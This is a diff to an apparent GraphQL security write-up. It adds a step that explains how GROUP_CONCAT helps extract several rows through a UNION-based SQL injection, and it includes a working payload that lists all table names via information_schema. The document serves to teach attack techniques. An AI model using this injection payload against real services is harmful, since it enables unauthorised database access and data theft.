@@ -134,6 +134,15 @@ the response:
 ```
 here we knew that it have SQL injection 
 from **introspection** we knew that `UserObject` have 6 columns  so we will use **`SQL UNION`** 
+As the GraphQL query only returns the first row, we will use the [GROUP_CONCAT](https://mariadb.com/kb/en/group_concat/) function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:
+```
+{
+  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
+    username
+  }  
+}
+```
+
 ## Discovering schema information(introspection)
 
 using build-in `GraphQL` function to get information about schema like Introspection
